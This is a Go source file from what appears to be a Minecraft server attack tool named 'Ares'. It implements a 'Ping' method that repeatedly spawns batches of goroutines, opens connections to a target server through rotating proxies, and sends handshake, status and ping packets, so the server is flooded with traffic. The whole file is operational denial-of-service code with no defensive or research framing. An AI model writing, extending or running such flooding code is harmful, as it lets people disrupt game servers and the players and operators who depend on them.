package methods

import (
	"Ares/core"
	"Ares/net/minecraft"
	"Ares/net/minecraft/packet"
	"Ares/utils/mcutils"
	"fmt"
	"net"
	"strconv"
	"time"
)

type Ping struct {
	Config          *core.AttackConfig
	isRunning       bool
	handshakePacket packet.Packet
	connBuffer      chan minecraft.Connection
}

func (p *Ping) Start() {
	p.connBuffer = make(chan minecraft.Connection, p.Config.PerDelay)
	ip, port, err := net.SplitHostPort(p.Config.Host)
	if err != nil {
		fmt.Println(err)
	}
	iport, _ := strconv.Atoi(port)
	if err != nil {
		fmt.Println(err)
	}

	p.handshakePacket = mcutils.GetHandshakePacket(ip, iport, p.Config.Version, mcutils.Status)

	p.isRunning = true

	done := make(chan struct{})

	p.loop(done)
}

func (p *Ping) loop(done chan struct{}) {
	ticker := time.NewTicker(p.Config.Delay)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			for i := 0; i < p.Config.PerDelay; i++ {
				go p.connect()
			}
			go p.closeChannels()
		case <-done:
			return
		}
	}
}

func (p *Ping) connect() {
	conn, err := minecraft.DialMc(p.Config.Host, p.Config.ProxyManager.GetNext())
	if err != nil {
		return
	}

	conn.WritePacket(p.handshakePacket)
	conn.WritePacket(packet.Marshal(
		0x00,
	))
	conn.WritePacket(packet.Marshal(
		0x01,
		packet.Long(time.Now().Unix()),
	))

	p.connBuffer <- *conn
}

func (p *Ping) closeChannels() {
	for i := 0; i < cap(p.connBuffer); i++ {
		select {
		case conn := <-p.connBuffer:
			conn.Close()
		default:
			break
		}
	}
}

func (p *Ping) Stop() {

}
